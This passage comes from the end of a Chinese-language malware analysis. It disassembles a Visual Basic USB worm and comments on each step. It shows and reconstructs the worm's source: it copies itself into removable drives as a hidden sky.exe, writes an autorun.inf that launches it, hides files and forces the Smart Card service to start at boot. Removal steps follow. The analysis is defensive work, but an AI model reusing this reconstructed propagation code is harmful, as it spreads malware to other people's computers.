> 0000478C:  05   ImpAdLdRf  
> 0000478F:  24   NewIfNullPr  
> 00004792:  0D   VCallHresult Global.Get\_App() As App  
> 00004797:  08   FLdPr var\_88  
> 0000479A:  0D   VCallHresult App.Get\_Path()  
> 0000479F:  6C   ILdRf szIE  
> 000047A2:  1B   LitStr: "\\"  
> 000047A5:  2A   ConcatStr  
> 000047A6:  23   FStStrNoPop var\_B8  
> 000047A9:  04   FLdRfVar var\_A0  
> 000047AC:  04   FLdRfVar var\_B4  
> 000047AF:  05   ImpAdLdRf  
> 000047B2:  24   NewIfNullPr  
> 000047B5:  0D   VCallHresult Global.Get\_App() As App  
> 000047BA:  08   FLdPr var\_B4  
> 000047BD:  0D   VCallHresult App.Get\_EXEName()  
> 000047C2:  6C   ILdRf var\_A0  
> 000047C5:  2A   ConcatStr  
> 000047C6:  23   FStStrNoPop var\_BC  
> 000047C9:  1B   LitStr: ".exe"  
> 000047CC:  2A   ConcatStr  
> 000047CD:  46   CVarStr var\_9C  
> 000047D0:  25   PopAdLdVar  
> 000047D1:  04   FLdRfVar var\_B0  
> 000047D4:  FF42 VarLateMemCallLdVar  
> 000047DC:  04   FLdRfVar var\_DC  
> 000047DF:  FE4E SetVarVarFunc  
> 000047E1:  32   FFreeStr szIE var\_B8 var\_A0 var\_BC  
> 000047EC:  29   FFreeAd: var\_88 var\_B4  
> 000047F3:  35   FFree1Var var\_9C  
> ;if dir(app.path & "\\scardsvr.exe")= "" then  
> ;  CopyFile app.path & "\\" & app.exename & ".exe",app.path & "\\scardsvr.exe"  
> ;end if  
> 000047F6:  00   LargeBos  
> 000047F8:  04   FLdRfVar szIE  
> 000047FB:  04   FLdRfVar var\_88  
> 000047FE:  05   ImpAdLdRf  
> 00004801:  24   NewIfNullPr  
> 00004804:  0D   VCallHresult Global.Get\_App() As App  
> 00004809:  08   FLdPr var\_88  
> 0000480C:  0D   VCallHresult App.Get\_Path()  
> 00004811:  6C   ILdRf szIE  
> 00004814:  1B   LitStr: "\\scardsvr.exe"  
> 00004817:  2A   ConcatStr  
> 00004818:  46   CVarStr var\_9C  
> 0000481B:  25   PopAdLdVar  
> 0000481C:  04   FLdRfVar var\_DC  
> 0000481F:  FD9F LdPrVar  
> 00004821:  FE98 LateMemCall  
> 00004827:  2F   FFree1Str szIE  
> 0000482A:  1A   FFree1Ad var\_88  
> 0000482D:  35   FFree1Var var\_9C  
> 00004830:  00   LargeBos  
> 00004832:  04   FLdRfVar szIE  
> 00004835:  04   FLdRfVar var\_88  
> 00004838:  05   ImpAdLdRf  
> 0000483B:  24   NewIfNullPr  
> 0000483E:  0D   VCallHresult Global.Get\_App() As App  
> 00004843:  08   FLdPr var\_88  
> 00004846:  0D   VCallHresult App.Get\_Path()  
> 0000484B:  6C   ILdRf szIE  
> 0000484E:  1B   LitStr: "\\scardsvr.exe"  
> 00004851:  2A   ConcatStr  
> 00004852:  46   CVarStr var\_9C  
> 00004855:  25   PopAdLdVar  
> 00004856:  04   FLdRfVar var\_B0  
> 00004859:  FF42 VarLateMemCallLdVar  
> 00004861:  04   FLdRfVar var\_DC  
> 00004864:  FE4E SetVarVarFunc  
> 00004866:  2F   FFree1Str szIE  
> 00004869:  1A   FFree1Ad var\_88  
> 0000486C:  35   FFree1Var var\_9C  
> 0000486F:  00   LargeBos  
> 00004871:  28   LitVarI2: 7 0x7 var\_CC  
> 00004876:  25   PopAdLdVar  
> 00004877:  04   FLdRfVar var\_DC  
> 0000487A:  FF43 VarLateMemSt  
> ;设置该文件属性为:系统隐藏只读属性  
> ;SetAttr app.path & "\\scardsvr.exe",vbhidden or vbsystem or vbreadonly  
> 0000487E:   
> 0000487E:  00   LargeBos  
> 00004880:  00   LargeBos  
> 00004882:  F5   LitI4: 0 0x0  
> 00004887:  1B   LitStr: "WScript.Shell"    ;运行该程序  
> ;shell app.path & "\\scardsvr.exe"  
> 0000488A:  04   FLdRfVar var\_9C  
> 0000488D:  0A   ImpAdCallFPR4 rtcCreateObject2  
> 00004892:  04   FLdRfVar var\_9C  
> 00004895:  04   FLdRfVar var\_10C  
> 00004898:  FE4E SetVarVarFunc  
> 0000489A:  00   LargeBos  
> 0000489C:  3A   LitVarStr: "HKEY\_LOCAL\_MACHINE\\System\\currentcontrolset\\services\\SCardSvr\\Start"  
> 000048A1:  25   PopAdLdVar  
> 000048A2:  04   FLdRfVar var\_10C  
> 000048A5:  FF42 VarLateMemCallLdVar  
> 000048AD:  FCF6 FStVar var\_11C  
> 000048B1:  00   LargeBos  
> 000048B3:  04   FLdRfVar var\_11C  
> 000048B6:  28   LitVarI2: 2 0x2 var\_CC  
> 000048BB:  5D   HardType  
> 000048BC:  FB40 NeVarBool <>  
> 000048BE:  1C   BranchF   000048EC  
> 000048C1:  00   LargeBos  
> 000048C3:  28   LitVarI2: 2 0x2 var\_CC  
> 000048C8:  FCF6 FStVar var\_11C  
> 000048CC:  00   LargeBos  
> 000048CE:  3A   LitVarStr: "HKEY\_LOCAL\_MACHINE\\System\\currentcontrolset\\services\\SCardSvr\\Start"  
> 000048D3:  25   PopAdLdVar  
> 000048D4:  04   FLdRfVar var\_11C  
> 000048D7:  FD93 CDargRef  
> 000048DB:  3A   LitVarStr: "REG\_DWORD"  
> 000048E0:  25   PopAdLdVar  
> 000048E1:  04   FLdRfVar var\_10C  
> 000048E4:  FD9F LdPrVar  
> 000048E6:  FE98 LateMemCall  
> ;修改注册表项使 Smart Card 服务启动类型为自动，也就是使病毒开机后自动运行,默认该服务已经存在,因此不必再添加服务  
> 000048EC:   
> 000048EC:  00   LargeBos  
> 000048EE:  00   LargeBos  
> 000048F0:  28   LitVarI2: 97 0x61 var\_12C  
> 000048F5:  04   FLdRfVar var\_15C  
> 000048F8:  28   LitVarI2: 108 0x6C var\_FC  
> 000048FD:  FE68 ForVar For (counter = start) To (end)    ;for i = 97 to 108 从 a 至 l 盘  
> 00004903:  00   LargeBos  
> 00004905:  04   FLdRfVar var\_15C  
> 00004908:  FC22 CI4Var  
> 0000490A:  04   FLdRfVar var\_9C  
> 0000490D:  0A   ImpAdCallFPR4 Chr()  
> 00004912:  04   FLdRfVar var\_9C  
> 00004915:  3A   LitVarStr: ":\\"  
> 0000491A:  FBEF ConcatVar  
> 0000491E:  FDFE CStrVarVal szIE  
> 00004922:  04   FLdRfVar var\_A0  
> 00004925:  34   CStr2Ansi  
> 00004926:  6C   ILdRf var\_A0  
> 00004929:  5E   ImpAdCallI4 KERNEL32.GetDriveTypeA  
> 0000492E:  71   FStR4 var\_180  
> 00004931:  3C   SetLastSystemError  
> 00004932:  6C   ILdRf var\_180  
> 00004935:  FD69 CVarI4 var\_FC  
> 00004939:  FCF6 FStVar var\_190  
> 0000493D:  32   FFreeStr szIE var\_A0  
> 00004944:  36   FFreeVar var\_9C var\_EC  
> 0000494B:  00   LargeBos  
> 0000494D:  04   FLdRfVar var\_190  
> 00004950:  28   LitVarI2: 2 0x2 var\_CC    ;判断是否为移动盘，不为移动盘则不进行感染操作  
> 00004955:  5D   HardType  
> 00004956:  FB33 EqVarBool =  
> 00004958:  1C   BranchF   Dis\_Next  
> 0000495B:  00   LargeBos  
> 0000495D:  04   FLdRfVar var\_15C  
> 00004960:  FC22 CI4Var  
> 00004962:  04   FLdRfVar var\_9C  
> 00004965:  0A   ImpAdCallFPR4 Chr()  
> 0000496A:  04   FLdRfVar var\_15C  
> 0000496D:  FC22 CI4Var  
> 0000496F:  04   FLdRfVar var\_1A0  
> 00004972:  0A   ImpAdCallFPR4 Chr()  
> 00004977:  F5   LitI4: 7 0x7  
> 0000497C:  04   FLdRfVar var\_9C  
> 0000497F:  3A   LitVarStr: ":\\sky.exe"    ;判断移动盘根目录下的 sky.exe 文件是否存在  
> 00004984:  FBEF ConcatVar  
> 00004988:  0B   ImpAdCallI2 Dir()  
> 0000498D:  23   FStStrNoPop szIE  
> 00004990:  1B   LitStr: ""  
> 00004993:  FB30 EqStr =  
> 00004995:  F5   LitI4: 7 0x7  
> 0000499A:  04   FLdRfVar var\_1A0  
> 0000499D:  3A   LitVarStr: ":\\autorun.inf"  ;判断移动盘根目录下的 autorun.inf 文件是否存在  
> 000049A2:  FBEF ConcatVar  
> 000049A6:  0B   ImpAdCallI2 Dir()  
> 000049AB:  23   FStStrNoPop var\_A0  
> 000049AE:  1B   LitStr: ""  
> 000049B1:  FB30 EqStr =  
> 000049B3:  C5   OrI4 Or          ;autorun.inf 和 sky.exe 两个文件有一者不存在就感染移动盘  
> 000049B4:  32   FFreeStr szIE var\_A0  
> 000049BB:  36   FFreeVar var\_9C var\_EC var\_1A0 var\_1B0  
> 000049C6:  1C   BranchF   Dis\_Next01    ;如果两个文件都存在则跳去处理下一分区  
> 000049C9:  00   LargeBos  
> 000049CB:  F5   LitI4: 0 0x0  
> 000049D0:  1B   LitStr: "Scripting.FileSystemObject"  
> 000049D3:  04   FLdRfVar var\_9C  
> 000049D6:  0A   ImpAdCallFPR4 rtcCreateObject2  
> 000049DB:  04   FLdRfVar var\_9C  
> 000049DE:  04   FLdRfVar var\_B0  
> 000049E1:  FE4E SetVarVarFunc  
> 000049E3:  00   LargeBos  
> 000049E5:  04   FLdRfVar var\_15C  
> 000049E8:  FC22 CI4Var  
> 000049EA:  04   FLdRfVar var\_9C  
> 000049ED:  0A   ImpAdCallFPR4 Chr()  
> 000049F2:  F5   LitI4: 7 0x7  
> 000049F7:  04   FLdRfVar var\_9C  
> 000049FA:  3A   LitVarStr: ":\\sky.exe"  
> 000049FF:  FBEF ConcatVar  
> 00004A03:  0B   ImpAdCallI2 Dir()  
> 00004A08:  23   FStStrNoPop szIE  
> 00004A0B:  1B   LitStr: ""  
> 00004A0E:  FB3D NeStr <>  
> 00004A10:  2F   FFree1Str szIE  
> 00004A13:  36   FFreeVar var\_9C var\_EC  
> 00004A1A:  1C   BranchF   00004A89  
> 00004A1D:  00   LargeBos  
> 00004A1F:  04   FLdRfVar var\_15C  
> 00004A22:  FC22 CI4Var  
> 00004A24:  04   FLdRfVar var\_9C  
> 00004A27:  0A   ImpAdCallFPR4 Chr()  
> 00004A2C:  04   FLdRfVar var\_9C  
> 00004A2F:  3A   LitVarStr: ":\\sky.exe"  
> 00004A34:  FBEF ConcatVar  
> 00004A38:  25   PopAdLdVar  
> 00004A39:  04   FLdRfVar var\_B0  
> 00004A3C:  FF42 VarLateMemCallLdVar  
> 00004A44:  04   FLdRfVar var\_DC  
> 00004A47:  FE4E SetVarVarFunc  
> 00004A49:  36   FFreeVar var\_9C var\_EC  
> 00004A50:  00   LargeBos  
> 00004A52:  28   LitVarI2: 32 0x20 var\_CC  
> 00004A57:  25   PopAdLdVar  
> 00004A58:  04   FLdRfVar var\_DC  
> 00004A5B:  FF43 VarLateMemSt  
> 00004A5F:  00   LargeBos  
> 00004A61:  04   FLdRfVar var\_15C  
> 00004A64:  FC22 CI4Var  
> 00004A66:  04   FLdRfVar var\_9C  
> 00004A69:  0A   ImpAdCallFPR4 Chr()  
> 00004A6E:  04   FLdRfVar var\_9C  
> 00004A71:  3A   LitVarStr: ":\\sky.exe"  
> 00004A76:  FBEF ConcatVar  
> 00004A7A:  0A   ImpAdCallFPR4 Kill()  ;移动盘根目录下的 sky.exe 文件存在则删除该文件  
> 00004A7F:  36   FFreeVar var\_9C var\_EC  
> 00004A86:  1E   Branch   00004B2C  
> 00004A89: loc\_00004A1A  
> 00004A89:  00   LargeBos  
> 00004A8B:  04   FLdRfVar var\_15C  
> 00004A8E:  FC22 CI4Var  
> 00004A90:  04   FLdRfVar var\_9C  
> 00004A93:  0A   ImpAdCallFPR4 Chr()  
> 00004A98:  F5   LitI4: 7 0x7  
> 00004A9D:  04   FLdRfVar var\_9C  
> 00004AA0:  3A   LitVarStr: ":\\autorun.inf"  
> 00004AA5:  FBEF ConcatVar  
> 00004AA9:  0B   ImpAdCallI2 Dir()  
> 00004AAE:  23   FStStrNoPop szIE  
> 00004AB1:  1B   LitStr: ""  
> 00004AB4:  FB3D NeStr <>  
> 00004AB6:  2F   FFree1Str szIE  
> 00004AB9:  36   FFreeVar var\_9C var\_EC  
> 00004AC0:  1C   BranchF   00004B2C  
> 00004AC3:  00   LargeBos  
> 00004AC5:  04   FLdRfVar var\_15C  
> 00004AC8:  FC22 CI4Var  
> 00004ACA:  04   FLdRfVar var\_9C  
> 00004ACD:  0A   ImpAdCallFPR4 Chr()  
> 00004AD2:  04   FLdRfVar var\_9C  
> 00004AD5:  3A   LitVarStr: ":\\autorun.inf"  
> 00004ADA:  FBEF ConcatVar  
> 00004ADE:  25   PopAdLdVar  
> 00004ADF:  04   FLdRfVar var\_B0  
> 00004AE2:  FF42 VarLateMemCallLdVar  
> 00004AEA:  04   FLdRfVar var\_DC  
> 00004AED:  FE4E SetVarVarFunc  
> 00004AEF:  36   FFreeVar var\_9C var\_EC  
> 00004AF6:  00   LargeBos  
> 00004AF8:  28   LitVarI2: 32 0x20 var\_CC  
> 00004AFD:  25   PopAdLdVar  
> 00004AFE:  04   FLdRfVar var\_DC  
> 00004B01:  FF43 VarLateMemSt  
> 00004B05:  00   LargeBos  
> 00004B07:  04   FLdRfVar var\_15C  
> 00004B0A:  FC22 CI4Var  
> 00004B0C:  04   FLdRfVar var\_9C  
> 00004B0F:  0A   ImpAdCallFPR4 Chr()  
> 00004B14:  04   FLdRfVar var\_9C  
> 00004B17:  3A   LitVarStr: ":\\autorun.inf"    ;移动盘的根目录下的 autrun.inf 文件存在则删除之  
> 00004B1C:  FBEF ConcatVar  
> 00004B20:  0A   ImpAdCallFPR4 Kill()  
> 00004B25:  36   FFreeVar var\_9C var\_EC  
> 00004B2C: loc\_00004AC0  
> 00004B2C: loc\_00004A86  
> 00004B2C:  00   LargeBos  
> 00004B2E:  00   LargeBos  
> 00004B30:  04   FLdRfVar szIE  
> 00004B33:  04   FLdRfVar var\_88  
> 00004B36:  05   ImpAdLdRf  
> 00004B39:  24   NewIfNullPr  
> 00004B3C:  0D   VCallHresult Global.Get\_App() As App  
> 00004B41:  08   FLdPr var\_88  
> 00004B44:  0D   VCallHresult App.Get\_Path()  
> 00004B49:  6C   ILdRf szIE  
> 00004B4C:  1B   LitStr: "\\"  
> 00004B4F:  2A   ConcatStr  
> 00004B50:  23   FStStrNoPop var\_B8  
> 00004B53:  04   FLdRfVar var\_A0  
> 00004B56:  04   FLdRfVar var\_B4  
> 00004B59:  05   ImpAdLdRf  
> 00004B5C:  24   NewIfNullPr  
> 00004B5F:  0D   VCallHresult Global.Get\_App() As App  
> 00004B64:  08   FLdPr var\_B4  
> 00004B67:  0D   VCallHresult App.Get\_EXEName()  
> 00004B6C:  6C   ILdRf var\_A0  
> 00004B6F:  2A   ConcatStr  
> 00004B70:  23   FStStrNoPop var\_BC  
> 00004B73:  1B   LitStr: ".exe"  
> 00004B76:  2A   ConcatStr  
> 00004B77:  46   CVarStr var\_9C  
> 00004B7A:  25   PopAdLdVar  
> 00004B7B:  04   FLdRfVar var\_B0  
> 00004B7E:  FF42 VarLateMemCallLdVar  
> 00004B86:  04   FLdRfVar var\_DC  
> 00004B89:  FE4E SetVarVarFunc  
> 00004B8B:  32   FFreeStr szIE var\_B8 var\_A0 var\_BC  
> 00004B96:  29   FFreeAd: var\_88 var\_B4  
> 00004B9D:  35   FFree1Var var\_9C  
> 00004BA0:  00   LargeBos  
> 00004BA2:  04   FLdRfVar var\_15C  
> 00004BA5:  FC22 CI4Var  
> 00004BA7:  04   FLdRfVar var\_9C  
> 00004BAA:  0A   ImpAdCallFPR4 Chr()  
> 00004BAF:  04   FLdRfVar var\_9C  
> 00004BB2:  3A   LitVarStr: ":\\sky.exe"    ;复制病毒自身至移动盘根目录下，命名为 sky.exe  
> 00004BB7:  FBEF ConcatVar  
> 00004BBB:  25   PopAdLdVar  
> 00004BBC:  04   FLdRfVar var\_DC  
> 00004BBF:  FD9F LdPrVar  
> 00004BC1:  FE98 LateMemCall  
> 00004BC7:  36   FFreeVar var\_9C var\_EC  
> 00004BCE:  00   LargeBos  
> 00004BD0:  04   FLdRfVar var\_15C  
> 00004BD3:  FC22 CI4Var  
> 00004BD5:  04   FLdRfVar var\_9C  
> 00004BD8:  0A   ImpAdCallFPR4 Chr()  
> 00004BDD:  04   FLdRfVar var\_9C  
> 00004BE0:  3A   LitVarStr: ":\\sky.exe"      ;设置文件属性为系统隐藏只读  
> 00004BE5:  FBEF ConcatVar  
> 00004BE9:  25   PopAdLdVar  
> 00004BEA:  04   FLdRfVar var\_B0  
> 00004BED:  FF42 VarLateMemCallLdVar  
> 00004BF5:  04   FLdRfVar var\_DC  
> 00004BF8:  FE4E SetVarVarFunc  
> 00004BFA:  36   FFreeVar var\_9C var\_EC  
> 00004C01:  00   LargeBos  
> 00004C03:  28   LitVarI2: 7 0x7 var\_CC  
> 00004C08:  25   PopAdLdVar  
> 00004C09:  04   FLdRfVar var\_DC  
> 00004C0C:  FF43 VarLateMemSt  
> 00004C10:  00   LargeBos  
> 00004C12:  04   FLdRfVar szIE  
> 00004C15:  04   FLdRfVar var\_88  
> 00004C18:  05   ImpAdLdRf  
> 00004C1B:  24   NewIfNullPr  
> 00004C1E:  0D   VCallHresult Global.Get\_App() As App  
> 00004C23:  08   FLdPr var\_88  
> 00004C26:  0D   VCallHresult App.Get\_Path()  
> 00004C2B:  04   FLdRfVar var\_15C  
> 00004C2E:  FC22 CI4Var  
> 00004C30:  04   FLdRfVar var\_EC  
> 00004C33:  0A   ImpAdCallFPR4 Chr()  
> 00004C38:  F5   LitI4: 7 0x7  
> 00004C3D:  6C   ILdRf szIE  
> 00004C40:  1B   LitStr: "\\windowsupdate.log"  
> 00004C43:  2A   ConcatStr  
> 00004C44:  46   CVarStr var\_9C  
> 00004C47:  0B   ImpAdCallI2 Dir()  
> 00004C4C:  23   FStStrNoPop var\_A0  
> 00004C4F:  1B   LitStr: ""  
> 00004C52:  FB3D NeStr <>  
> 00004C54:  F5   LitI4: 7 0x7  
> 00004C59:  04   FLdRfVar var\_EC  
> 00004C5C:  3A   LitVarStr: ":\\systemcheck.log"  
> 00004C61:  FBEF ConcatVar  
> 00004C65:  0B   ImpAdCallI2 Dir()  
> 00004C6A:  23   FStStrNoPop var\_B8  
> 00004C6D:  1B   LitStr: ""  
> 00004C70:  FB30 EqStr =  
> 00004C72:  C4   AndI4 And    ;判断程序当前目录下的 windowsupdate.log 和移动盘根目录下的 systemcheck.log  
> 文件是否存在，当程序当前目录下的 windowsupdate.log 文件存在并且移动盘根目录下的 systemcheck.log 文件不存在时，  
> 复制 windowsupdate.log 为移动盘根目录下 systemcheck.log,并设置复制后的文件属性为系统隐藏只读  
> 00004C73:  32   FFreeStr szIE var\_A0 var\_B8  
> 00004C7C:  1A   FFree1Ad var\_88  
> 00004C7F:  36   FFreeVar var\_9C var\_EC var\_1A0  
> 00004C88:  1C   BranchF   00004D3A  
> 00004C8B:  00   LargeBos  
> 00004C8D:  04   FLdRfVar szIE  
> 00004C90:  04   FLdRfVar var\_88  
> 00004C93:  05   ImpAdLdRf  
> 00004C96:  24   NewIfNullPr  
> 00004C99:  0D   VCallHresult Global.Get\_App() As App  
> 00004C9E:  08   FLdPr var\_88  
> 00004CA1:  0D   VCallHresult App.Get\_Path()  
> 00004CA6:  6C   ILdRf szIE  
> 00004CA9:  1B   LitStr: "\\windowsupdate.log"  
> 00004CAC:  2A   ConcatStr  
> 00004CAD:  46   CVarStr var\_9C  
> 00004CB0:  25   PopAdLdVar  
> 00004CB1:  04   FLdRfVar var\_B0  
> 00004CB4:  FF42 VarLateMemCallLdVar  
> 00004CBC:  04   FLdRfVar var\_DC  
> 00004CBF:  FE4E SetVarVarFunc  
> 00004CC1:  2F   FFree1Str szIE  
> 00004CC4:  1A   FFree1Ad var\_88  
> 00004CC7:  35   FFree1Var var\_9C  
> 00004CCA:  00   LargeBos  
> 00004CCC:  04   FLdRfVar var\_15C  
> 00004CCF:  FC22 CI4Var  
> 00004CD1:  04   FLdRfVar var\_9C  
> 00004CD4:  0A   ImpAdCallFPR4 Chr()  
> 00004CD9:  04   FLdRfVar var\_9C  
> 00004CDC:  3A   LitVarStr: ":\\systemcheck.log"  
> 00004CE1:  FBEF ConcatVar  
> 00004CE5:  25   PopAdLdVar  
> 00004CE6:  04   FLdRfVar var\_DC  
> 00004CE9:  FD9F LdPrVar  
> 00004CEB:  FE98 LateMemCall  
> 00004CF1:  36   FFreeVar var\_9C var\_EC  
> 00004CF8:  00   LargeBos  
> 00004CFA:  04   FLdRfVar var\_15C  
> 00004CFD:  FC22 CI4Var  
> 00004CFF:  04   FLdRfVar var\_9C  
> 00004D02:  0A   ImpAdCallFPR4 Chr()  
> 00004D07:  04   FLdRfVar var\_9C  
> 00004D0A:  3A   LitVarStr: ":\\systemcheck.log"  
> 00004D0F:  FBEF ConcatVar  
> 00004D13:  25   PopAdLdVar  
> 00004D14:  04   FLdRfVar var\_B0  
> 00004D17:  FF42 VarLateMemCallLdVar  
> 00004D1F:  04   FLdRfVar var\_DC  
> 00004D22:  FE4E SetVarVarFunc  
> 00004D24:  36   FFreeVar var\_9C var\_EC  
> 00004D2B:  00   LargeBos  
> 00004D2D:  28   LitVarI2: 7 0x7 var\_CC  
> 00004D32:  25   PopAdLdVar  
> 00004D33:  04   FLdRfVar var\_DC  
> 00004D36:  FF43 VarLateMemSt  
> 00004D3A: loc\_00004C88  
> 00004D3A:  00   LargeBos  
> 00004D3C:  00   LargeBos  
> 00004D3E:  27   LitVar\_Missing  
> 00004D41:  0B   ImpAdCallI2 FreeFile()    ;var = freefile  
> 00004D46:  44   CVarI2 var\_FC  
> 00004D49:  FCF6 FStVar var\_11C  
> 00004D4D:  35   FFree1Var var\_9C  
> 00004D50:  00   LargeBos  
> 00004D52:  04   FLdRfVar var\_15C  
> 00004D55:  FC22 CI4Var  
> 00004D57:  04   FLdRfVar var\_9C  
> 00004D5A:  0A   ImpAdCallFPR4 Chr()  
> 00004D5F:  04   FLdRfVar var\_9C  
> 00004D62:  3A   LitVarStr: ":\\autorun.inf"    ;在移动盘的根目录下生成 autorun.inf 文件.  
> 00004D67:  FBEF ConcatVar  
> 00004D6B:  60   CStrVarTmp  
> 00004D6C:  23   FStStrNoPop szIE  
> 00004D6F:  04   FLdRfVar var\_11C  
> 00004D72:  55   CI2Var  
> 00004D73:  F4   LitI2\_Byte: 255 0xFF (True)  
> 00004D75:  FE5D OpenFile  
> 00004D79:  2F   FFree1Str szIE  
> 00004D7C:  36   FFreeVar var\_9C var\_EC  
> 00004D83:  00   LargeBos  
> 00004D85:  1B   LitStr: "\[AutoRun\]"  
> 00004D88:  04   FLdRfVar var\_11C  
> 00004D8B:  55   CI2Var  
> 00004D8C:  FF0E PrintFile Print #filenumber, \[outputlist\]  
> 00004D92:  00   LargeBos  
> 00004D94:  1B   LitStr: "open=sky.exe"  
> 00004D97:  04   FLdRfVar var\_11C  
> 00004D9A:  55   CI2Var  
> 00004D9B:  FF0E PrintFile Print #filenumber, \[outputlist\]  
> 00004DA1:  00   LargeBos  
> 00004DA3:  1B   LitStr: "shellexecute=sky.exe"  
> 00004DA6:  04   FLdRfVar var\_11C  
> 00004DA9:  55   CI2Var  
> 00004DAA:  FF0E PrintFile Print #filenumber, \[outputlist\]  
> 00004DB0:  00   LargeBos  
> 00004DB2:  1B   LitStr: "shell\\Auto\\command=sky.exe"  
> 00004DB5:  04   FLdRfVar var\_11C  
> 00004DB8:  55   CI2Var  
> 00004DB9:  FF0E PrintFile Print #filenumber, \[outputlist\]  
> 00004DBF:  00   LargeBos  
> 00004DC1:  1B   LitStr: "shell=Auto"  
> 00004DC4:  04   FLdRfVar var\_11C  
> 00004DC7:  55   CI2Var  
> 00004DC8:  FF0E PrintFile Print #filenumber, \[outputlist\]  
> 00004DCE:  00   LargeBos  
> 00004DD0:  FD3E CloseAll  
> 00004DD2:  00   LargeBos  
> 00004DD4:  04   FLdRfVar var\_15C  
> 00004DD7:  FC22 CI4Var  
> 00004DD9:  04   FLdRfVar var\_9C  
> 00004DDC:  0A   ImpAdCallFPR4 Chr()  
> 00004DE1:  04   FLdRfVar var\_9C  
> 00004DE4:  3A   LitVarStr: ":\\autorun.inf"  
> 00004DE9:  FBEF ConcatVar  
> 00004DED:  25   PopAdLdVar  
> 00004DEE:  04   FLdRfVar var\_B0  
> 00004DF1:  FF42 VarLateMemCallLdVar  
> 00004DF9:  04   FLdRfVar var\_DC  
> 00004DFC:  FE4E SetVarVarFunc  
> 00004DFE:  36   FFreeVar var\_9C var\_EC  
> 00004E05:  00   LargeBos  
> 00004E07:  28   LitVarI2: 7 0x7 var\_CC  
> 00004E0C:  25   PopAdLdVar  
> 00004E0D:  04   FLdRfVar var\_DC  
> 00004E10:  FF43 VarLateMemSt  
> Dis\_Next01:   
> 00004E14:  00   LargeBos  
> Dis\_Next:   
> 00004E16:  00   LargeBos  
> 00004E18:  00   LargeBos  
> 00004E1A:  04   FLdRfVar var\_15C  
> 00004E1D:  FE7E NextStepVar Next (element)  
> 00004E23:  00   LargeBos  
> 00004E25:  13   ExitProcHresult  
> ;这部分的循环代码比较长，总结一下这部分源代码如下:  
> ;Private sub Timer1\_Timer()  
> ;Dim i As Long  
> ;Dim szDrive As String  
> ;Dim szRoot As String  
> ;Dim fn As Long  
>   
> ;For i = 97 To 108  
> ;    szDrive = Chr$(i)  
> ;    szRoot = Chr$(i) & ":\\"  
> ;    If GetDriveType(szRoot) = DRIVE\_REMOVABLE Then  
> ;        If Dir(szDrive & ":\\sky.exe", vbHidden Or vbReadOnly Or vbSystem) = "" \_  
> ;        Or Dir(szDrive & ":\\autorun.inf", vbHidden Or vbReadOnly Or vbSystem) = "" Then  
> ;            If Dir(szDrive & ":\\sky.exe", vbHidden Or vbReadOnly Or vbSystem) <> "" Then  
> ;                SetAttr szDrive & ":\\sky.exe", vbNormal  
> ;                Kill szDrive & ":\\sky.exe"  
> ;            End If  
> ;            If Dir(szDrive & ":\\autorun.inf", vbHidden Or vbReadOnly Or vbSystem) <> "" Then  
> ;                SetAttr szDrive & ":\\autorun.inf", vbNormal  
> ;                Kill szDrive & ":\\autorun.inf"  
> ;            End If  
> ;            FileCopy App.Path & "\\" & App.EXEName & ".exe", szDrive & ":\\sky.exe"  
> ;            SetAttr szDrive & ":\\sky.exe", vbHidden Or vbReadOnly Or vbSystem  
> ;  
> ;            If Dir(App.Path & "\\windowsupdate.log", vbSystem Or vbHidden Or vbReadOnly) <> "" \_  
> ;            And Dir(szDrive & ":\\systemcheck.log", vbHidden Or vbSystem Or vbReadOnly) = "" Then  
> ;                FileCopy App.Path & "\\windowsupdate.log", szDrive & ":\\systemcheck.log"  
> ;                SetAttr szDrive & ":\\systemcheck.log", vbHidden Or vbSystem Or vbReadOnly  
> ;            End If  
> ;            fn = FreeFile  
> ;            Open szDrive & ":\\autorun.inf" For Output As fn  
> ;                Print #fn, "\[AutoRun\]"  
> ;                Print #fn, "open=sky.exe"  
> ;                Print #fn, "shellexecute=sky.exe"  
> ;                Print #fn, "shell\\Auto\\command=sky.exe"  
> ;                Print #fn, "shell=Auto"  
> ;            Close fn  
> ;            SetAttr szDrive & ":\\autorun.inf", vbHidden Or vbSystem Or vbReadOnly  
> ;        End If  
> ;    End If  
> ;Next i  
> ;End Sub   
> End Sub  
>   
> 到这里为止，病毒的三个的代码分析都讲完了，这回对三个事件做个简单的总结:  
>   
> 事    件  说    明  
> Main   复制病毒体 IExplorer.exe、scardsvr.exe、运行灰鸽子程序  
> Form\_Load   启动设置计时器 Timer，激活计时器  
> Timer1\_Timer   感染可用的移动盘、生成病毒 u 盘自启动文件、设置病毒服务开机自启动  
>    
>   
> 【解决方案】:  
> 这里怎么清除该病毒，清除方法如下:  
> 1、中止系统进程中的"scardsvr.exe";  
> 2、删除%system%\\dllcache 目录下的 scardsvr.exe;  
> 3、删除系统目录下的 IExplorer.exe 和 scardsvr.exe;  
> 4、在运行中输入:"services.msc",然后将以下服务设置为禁止启动:  
> 名称:Smart Card  
> 描述:管理此计算机对智能卡的取读访问。如果此服务被终止，此计算机将无法取读智能卡。如果此服务被禁用，任何依赖它的服务将无法启动。  
> 路径:C:\\WINDOWS\\System32\\SCardSvr.exe  
> 将启动类型改成禁止  
> 5、删除系统目录下的 windowsupdate.log 和 systemcheck.log。  
> 6、删除各移动盘内的 sky.exe 和 autorun.inf 以及 systemcheck.log。  
> 这样这个病毒就清除干净了，下面说说该病毒并行的灰鸽子清除方法:  
> 重启进入安模式，删除%windir%\\system32\\msddsl.ex,再重启就行了(由于文件被删除了，因此服务删不删除都没有太大关系)。  
>   
>   
> 全文完 

>  

 4dd466d0e1e0cc123afbe504da2462ca